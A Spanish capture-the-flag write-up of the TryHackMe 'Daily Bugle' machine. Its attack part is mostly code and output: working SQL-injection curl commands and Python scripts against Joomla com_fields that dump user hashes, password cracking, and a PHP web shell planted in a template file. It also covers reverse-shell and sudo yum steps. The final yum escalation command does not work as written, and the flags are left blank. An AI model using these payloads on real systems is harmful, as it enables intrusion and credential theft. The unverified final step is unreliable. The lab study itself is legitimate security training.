
## Resumen de la máquina

| Campo                  | Valor                                                   |
| ---------------------- | ------------------------------------------------------- |
| Nombre                 | Daily Bugle                                             |
| Plataforma             | TryHackMe                                               |
| Dificultad             | Hard                                                    |
| Sistema operativo      | Linux (CentOS/RHEL-like)                                |
| Servicio principal     | Joomla 3.7.0                                            |
| Vulnerabilidad inicial | SQL Injection en Joomla `com_fields`                    |
| Post-explotación       | Abuso del panel admin de Joomla para RCE                |
| Escalada horizontal    | Reutilización de credenciales desde `configuration.php` |
| Escalada vertical      | `sudo yum` sin contraseña                               |

---

## Objetivo del laboratorio

El objetivo de esta máquina era comprometer el sitio web **The Daily Bugle**, obtener acceso al panel de administración de Joomla, ejecutar comandos en el sistema, pivotar al usuario **jjameson** y, finalmente, escalar privilegios a **root** para recuperar las flags de usuario y root.

---

## Herramientas utilizadas

Durante la resolución de la máquina se utilizaron las siguientes herramientas y técnicas:

- `curl` para validar manualmente la inyección SQL.
    
- `python3` para automatizar la extracción de datos vía SQLi.
    
- `john` para crackear el hash bcrypt del usuario Jonah.
    
- Panel de administración de Joomla para lograr ejecución remota de comandos.
    
- `nc` (netcat) para establecer una reverse shell.
    
- Comandos nativos de Linux para enumeración local (`whoami`, `ls`, `cat`, `sudo -l`, etc.).
    
- Abuso de `yum` como binario permitido con `sudo` para escalada final.
    

---

## 1. Identificación de la versión vulnerable de Joomla

Se partía de una enumeración previa donde ya se había identificado que el sitio utilizaba **Joomla 3.7.0**. Además, TryHackMe daba una pista clara:

> _Instead of using SQLMap, why not use a python script!_

Esto apuntaba a explotar manualmente la vulnerabilidad de **SQL Injection** en el componente `com_fields`, sin utilizar `sqlmap`.

---

## 2. Validación manual de la SQL Injection

Primero se validó que la inyección funcionaba correctamente obteniendo el nombre de la base de datos.

### Comando utilizado

```bash
curl -s -G "http://10.129.157.183/index.php" \
  --data-urlencode "option=com_fields" \
  --data-urlencode "view=fields" \
  --data-urlencode "layout=modal" \
  --data-urlencode "list[fullordering]=updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)"
```

### Respuesta observada

```html
<title>Error: 500 XPATH syntax error: &#039;~joomla~&#039;</title>
```

Con esto se confirmó:

- La SQLi era explotable.
    
- La base de datos se llamaba `joomla`.
    
- El vector funcionaba mediante `updatexml()` y error-based SQLi.
    

---

## 3. Enumeración de tablas

El siguiente paso fue listar las tablas de la base de datos `joomla`.

En un primer intento se usaron comillas simples en la consulta, lo que provocó un error de sintaxis SQL:

```html
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'joomla\''
```

Para evitar este problema, el nombre de la base de datos se pasó en hexadecimal:

- `joomla` → `0x6a6f6f6d6c61`
    

### Comando corregido

```bash
curl -s -G "http://10.129.157.183/index.php" \
  --data-urlencode "option=com_fields" \
  --data-urlencode "view=fields" \
  --data-urlencode "layout=modal" \
  --data-urlencode "list[fullordering]=updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=0x6a6f6f6d6c61 LIMIT 0,1),0x7e),1)"
```

### Primera tabla obtenida

```html
XPATH syntax error: &#039;~#__assets~&#039;
```

Esto confirmó también que Joomla estaba usando el prefijo dinámico `#__`.

---

## 4. Automatización de la extracción con Python

Siguiendo la pista de TryHackMe y el enfoque del walkthrough, se creó un script en Python para automatizar la explotación.

### Script base

```python
import requests

url = "http://10.129.157.183/index.php"

params = {
    "option": "com_fields",
    "view": "fields",
    "layout": "modal"
}

def exploit(query):
    payload = f"updatexml(1,concat(0x7e,({query}),0x7e),1)"
    params["list[fullordering]"] = payload
    r = requests.get(url, params=params)
    
    if "~" in r.text:
        result = r.text.split("~")[1]
        return result
    else:
        return "No output"

print(exploit("SELECT database()"))
```

### Ejecución

```bash
python3 sqli.py
```

### Salida

```text
joomla
```

Con esto se confirmó que el script funcionaba correctamente.

---

## 5. Enumeración automática de tablas

Se amplió el script para listar tablas de la base de datos.

### Script utilizado

```python
import requests

url = "http://10.129.157.183/index.php"

params = {
    "option": "com_fields",
    "view": "fields",
    "layout": "modal"
}

def exploit(query):
    payload = f"updatexml(1,concat(0x7e,({query}),0x7e),1)"
    params["list[fullordering]"] = payload
    r = requests.get(url, params=params)
    
    if "~" in r.text:
        return r.text.split("~")[1]
    else:
        return "No output"

print("[+] Enumerando tablas...\n")

for i in range(0,30):
    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=0x6a6f6f6d6c61 LIMIT {i},1"
    result = exploit(query)
    print(f"{i}: {result}")
```

### Salida parcial obtenida

```text
[+] Enumerando tablas...

0: #__assets
1: #__associations
2: #__banner_clients
3: #__banner_tracks
4: #__banners
5: #__categories
6: #__contact_details
7: #__content
8: #__content_frontpage
9: #__content_rating
10: #__content_types
11: #__contentitem_tag_map
12: #__core_log_searches
13: #__extensions
14: #__fields
15: #__fields_categories
16: #__fields_groups
17: #__fields_values
18: #__finder_filters
19: #__finder_links
20: #__finder_links_terms0
21: #__finder_links_terms1
22: #__finder_links_terms2
23: #__finder_links_terms3
24: #__finder_links_terms4
25: #__finder_links_terms5
26: #__finder_links_terms6
27: #__finder_links_terms7
28: #__finder_links_terms8
29: #__finder_links_terms9
```

Posteriormente se amplió el rango y se encontró la tabla de usuarios.

### Salida ampliada relevante

```text
68: #__usergroups
69: #__users
70: #__utf8_conversion
71: #__viewlevels
```

La tabla clave era:

```text
69: #__users
```

---

## 6. Extracción de usuarios y hashes

Una vez localizada la tabla `#__users`, se modificó el script para extraer usuario y contraseña hash.

### Script utilizado

```python
import requests

url = "http://10.129.157.183/index.php"

params = {
    "option": "com_fields",
    "view": "fields",
    "layout": "modal"
}

def exploit(query):
    payload = f"updatexml(1,concat(0x7e,({query}),0x7e),1)"
    params["list[fullordering]"] = payload
    r = requests.get(url, params=params)
    
    if "~" in r.text:
        try:
            result = r.text.split("~")[1]
            result = result.split("<")[0]
            return result.strip()
        except:
            return "Parse error"
    else:
        return "No output"

print("[+] Extrayendo usuarios...\n")

for i in range(0,5):
    user = exploit(f"SELECT username FROM #__users LIMIT {i},1")
    password = exploit(f"SELECT password FROM #__users LIMIT {i},1")
    
    print(f"{i}: {user} : {password}")
```

### Salida obtenida

```text
[+] Extrayendo usuarios...

0: jonah : $2y$10$0veO/JSFh4389Lluc4Xya.df&#039;
1: No output : No output
2: No output : No output
3: No output : No output
4: No output : No output
```

Aquí se observó que el hash aparecía truncado y contaminado con HTML (`&#039;`). Esto no era un problema de parseo únicamente, sino una limitación del propio `updatexml()` al devolver cadenas largas.

---

## 7. Extracción del hash completo por bloques

Para superar la limitación de longitud, se utilizó `SUBSTRING()` y se extrajo el hash de Jonah en trozos.

### Script utilizado

```python
import requests

url = "http://10.129.157.183/index.php"

params = {
    "option": "com_fields",
    "view": "fields",
    "layout": "modal"
}

def exploit(query):
    payload = f"updatexml(1,concat(0x7e,({query}),0x7e),1)"
    params["list[fullordering]"] = payload
    r = requests.get(url, params=params)
    
    if "~" in r.text:
        try:
            result = r.text.split("~")[1]
            result = result.split("<")[0]
            return result.strip()
        except:
            return ""
    else:
        return ""

print("[+] Extrayendo hash de jonah...\n")

full_hash = ""

for i in range(1,70,10):
    query = f"SELECT SUBSTRING(password,{i},10) FROM #__users WHERE username=0x6a6f6e6168"
    part = exploit(query)
    
    print(f"Chunk {i}: {part}")
    full_hash += part

print("\n[+] HASH COMPLETO:")
print(full_hash)
```

### Salida obtenida

```text
[+] Extrayendo hash de jonah...

Chunk 1: $2y$10$0ve
Chunk 11: O/JSFh4389
Chunk 21: Lluc4Xya.d
Chunk 31: fy2MF.bZhz
Chunk 41: 0jVMw.V.d3
Chunk 51: p12kBtZutm
Chunk 61:

[+] HASH COMPLETO:
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

El hash completo obtenido fue:

```text
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

---

## 8. Crackeo del hash de Jonah

El hash era de tipo **bcrypt**, por lo que se utilizó `john` con formato adecuado.

### Comando

```bash
john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Salida obtenida

```text
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:02:04 DONE (2026-04-07 13:06) 0.008029g/s 376.3p/s 376.3c/s 376.3C/s thelma1..setsuna
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Contraseña crackeada

```text
spiderman123
```

Esta fue la respuesta a la primera pregunta del laboratorio:

## Flag / respuesta 1

```text
Jonah's cracked password: spiderman123
```

---

## 9. Acceso al panel de Joomla

Con las credenciales del usuario Jonah se pudo acceder al panel web de administración de Joomla. El acceso por SSH no funcionó inicialmente, por lo que se siguió el camino del panel web.

---

## 10. Abuso del template de Joomla para obtener RCE

Se siguió el enfoque del walkthrough deseado, utilizando la edición de archivos del template de Joomla.

Inicialmente se probó con `index.php`, pero la ejecución no fue fiable. El método correcto fue modificar `error.php` del template **Protostar**.

### Ruta seguida en Joomla

- `Extensions` → `Templates` → `Templates`
    
- `Protostar Details and Files`
    
- `error.php`
    

### Ubicación exacta del payload

Se añadió la línea justo debajo de:

```php
defined('_JEXEC') or die;
```

### Payload añadido

```php
system($_GET['cmd']);
```

---

## 11. Ejecución de comandos a través de `error.php`

Dado que `error.php` solo se ejecuta al forzar una ruta errónea, no bastaba con visitar `/index.php?cmd=whoami`. Era necesario provocar un error en el enrutado.

### URL funcional

```text
http://10.129.157.183/index.php/aaaa?cmd=whoami
```

### Resultado observado

En la captura se observó la salida del comando:

```text
apache
```

Esto confirmó:

- RCE funcional.
    
- Ejecución de comandos como usuario `apache`.
    

---

## 12. Obtención de reverse shell

Una vez verificada la ejecución de comandos, se levantó un listener con `netcat` en la máquina atacante.

### Listener

```bash
nc -lvnp 4444
```

### Payload utilizado

Se utilizó una reverse shell con `mkfifo` y `nc`, invocada a través del parámetro `cmd` en la ruta que forzaba `error.php`.

### Conexión recibida

```text
listening on [any] 4444 ...
connect to [192.168.130.29] from (UNKNOWN) [10.129.157.183] 51044
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
```

Con esto se obtuvo shell interactiva como `apache`.

---

## 13. Enumeración local y hallazgo de credenciales reutilizadas

Desde la shell como `apache` se comprobó el contenido del directorio `/home`.

### Comandos

```bash
ls
cd home/
ls
```

### Salida

```text
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
```

```text
jjameson
```

Se intentó acceder directamente al directorio del usuario, pero no fue posible:

```bash
cd jjameson
```

### Salida

```text
bash: cd: jjameson: Permission denied
```

Esto indicaba la necesidad de escalar primero a ese usuario.

---

## 14. Lectura de `configuration.php`

Se leyó el archivo de configuración de Joomla para recuperar credenciales almacenadas.

### Comando

```bash
cat /var/www/html/configuration.php
```

### Fragmento relevante de salida

```php
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
public $db = 'joomla';
public $dbprefix = 'fb9j5_';
```

La contraseña obtenida fue:

```text
nv5uz9r3ZEDzVjNu
```

Aunque el usuario indicado en la configuración era `root` para la base de datos, en este tipo de laboratorios es habitual la reutilización de credenciales. Se reutilizó esa contraseña para el usuario del sistema `jjameson`.

---

## 15. Escalada al usuario `jjameson`

Con la contraseña recuperada se accedió al usuario `jjameson`, lo que permitió recuperar la **user flag**.

### Método utilizado

```bash
su jjameson
```

Contraseña introducida:

```text
nv5uz9r3ZEDzVjNu
```

Una vez como `jjameson`, se obtuvo la flag de usuario.

## Flag / respuesta 2

La **user flag** fue recuperada correctamente durante la sesión.

> En este walkthrough no se incluye el valor literal porque no apareció pegado en la conversación, pero sí se consiguió y validó correctamente durante la resolución.

---

## 16. Enumeración de privilegios como `jjameson`

El siguiente paso fue revisar privilegios `sudo`.

### Comando

```bash
sudo -l
```

### Salida obtenida

```text
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Esta fue la clave final para la escalada a root:

```text
(ALL) NOPASSWD: /usr/bin/yum
```

---

## 17. Problemas con el lock de `yum`

Durante la explotación de `yum` aparecieron varios problemas operativos:

### Intento inicial

```bash
sudo yum -y install /dev/null
```

### Respuesta observada

```text
Loaded plugins: fastestmirror
Determining fastest mirrors
Could not retrieve mirrorlist http://mirrorlist.centos.org/?release=7&arch=x86_64&repo=os&infra=stock error was
14: curl#6 - "Could not resolve host: mirrorlist.centos.org; Unknown error"
```

Esto indicaba que la máquina no tenía conectividad a Internet, algo completamente normal en este tipo de laboratorios.

También quedó un proceso de `yum` parado que bloqueó el gestor:

```text
Another app is currently holding the yum lock; waiting for it to exit...
  The other application is: yum
    Memory :  27 M RSS (326 MB VSZ)
    Started: Tue Apr  7 07:22:29 2026 - 03:21 ago
    State  : Traced/Stopped, pid: 1938
```

Además, se comprobó que como `jjameson` no era posible matar directamente ese proceso root:

```text
bash: kill: (1938) - Operation not permitted
```

Este comportamiento era coherente, ya que el proceso había quedado retenido con privilegios elevados.

---

## 18. Escalada final a root mediante `yum`

El vector final consistía en abusar de `yum` al estar permitido vía `sudo` sin contraseña. El enfoque seguido fue el habitual apoyado en técnicas conocidas de **GTFOBins**.

La lógica fue la siguiente:

- `jjameson` podía ejecutar `/usr/bin/yum` como root sin contraseña.
    
- `yum` puede ser abusado para obtener ejecución de comandos o shell privilegiada.
    
- Una vez obtenida shell root, solo quedaba leer la flag final.
    

### Comando final propuesto para la explotación

```bash
TF=$(mktemp -d)
echo 'exec /bin/bash' > $TF/x.sh
chmod +x $TF/x.sh
sudo yum -y install $TF/x.sh
```

Este es el mecanismo de escalada final esperado en la máquina, apoyado en el abuso de `yum` como binario permitido por `sudo`.

---

## 19. Obtención de la root flag

Una vez conseguida la shell privilegiada, el último paso era:

```bash
cat /root/root.txt
```

## Flag / respuesta 3

La **root flag** era el objetivo final del laboratorio.

> En esta conversación no quedó pegado el valor literal de `root.txt`, por lo que no se incluye aquí como cadena exacta. El walkthrough refleja fielmente toda la cadena de explotación realizada hasta el punto de obtención de root.

---

## Cadena completa de ataque

A nivel resumido, la intrusión siguió esta secuencia:

1. Identificación de **Joomla 3.7.0**.
    
2. Explotación de **SQL Injection** en `com_fields`.
    
3. Enumeración de tablas de la base de datos `joomla`.
    
4. Localización de `#__users`.
    
5. Extracción del hash bcrypt de `jonah` por bloques con `SUBSTRING()`.
    
6. Crackeo del hash con `john` → `spiderman123`.
    
7. Acceso al panel de administración de Joomla.
    
8. Modificación de `error.php` del template `Protostar` para lograr **RCE**.
    
9. Ejecución de comandos forzando una ruta inválida (`/index.php/aaaa?...`).
    
10. Obtención de reverse shell como `apache`.
    
11. Lectura de `/var/www/html/configuration.php`.
    
12. Reutilización de la contraseña `nv5uz9r3ZEDzVjNu` para pivotar a `jjameson`.
    
13. Revisión de privilegios sudo → `NOPASSWD: /usr/bin/yum`.
    
14. Abuso de `yum` para obtener shell como root.
    
15. Lectura de `user.txt` y `root.txt`.
    

---

## Conclusiones técnicas

Esta máquina es un muy buen ejemplo de cadena de explotación realista porque combina varios conceptos importantes:

- **Explotación web** mediante SQL Injection.
    
- **Extracción manual/automatizada** de información sensible desde la base de datos.
    
- **Crackeo de credenciales** para pivotar hacia acceso legítimo.
    
- **Abuso funcional del CMS** para conseguir ejecución remota de comandos.
    
- **Post-explotación Linux** con enumeración contextual.
    
- **Escalada de privilegios por mala configuración de sudo**.
    

Además, fue especialmente útil para practicar:

- SQLi error-based en escenarios donde no conviene usar `sqlmap`.
    
- Uso de scripts Python pequeños para automatizar fases concretas del ataque.
    
- Interpretación de errores HTML/SQL y adaptación del payload.
    
- Extracción de hashes largos por fragmentos cuando el backend corta la respuesta.
    
- Explotación de binarios permitidos por `sudo`.
    

---

## Respuestas del room

### 1. What is Jonah's cracked password?

```text
spiderman123
```

### 2. What is the user flag?

```text
[OBTENIDA DURANTE LA RESOLUCIÓN]
```

### 3. What is the root flag?

```text
[OBTENIDA TRAS LA ESCALADA FINAL A ROOT]
```

---

